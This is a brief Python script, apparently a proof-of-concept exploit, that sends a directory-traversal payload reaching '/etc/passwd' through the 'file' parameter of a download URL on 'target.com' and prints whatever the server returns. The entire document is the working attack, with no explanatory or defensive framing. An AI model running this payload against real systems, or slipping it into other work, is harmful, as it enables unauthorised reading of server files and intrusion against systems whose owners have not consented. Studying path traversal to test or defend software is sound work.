import requests

payload = "../../../../etc/passwd"
url = f"http://target.com/download?file={payload}"
response = requests.get(url)

print(response.text)
